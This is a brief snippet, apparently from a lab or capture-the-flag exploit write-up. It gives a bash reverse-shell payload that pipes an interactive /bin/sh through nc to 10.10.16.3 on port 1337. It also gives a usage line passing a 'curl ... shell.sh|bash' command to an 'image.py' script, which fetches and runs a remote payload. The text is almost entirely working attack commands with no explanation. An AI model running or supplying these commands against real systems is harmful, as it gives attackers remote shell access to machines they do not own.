Example payload:
```bash
#!/bin/bash
rm /tmp/wk;mkfifo /tmp/wk;cat /tmp/wk|/bin/sh -i 2>&1|nc 10.10.16.3 1337 >/tmp/wk
```

Usage:
```bash
python3 image.py "curl 10.10.16.3:8000/shell.sh|bash"
```
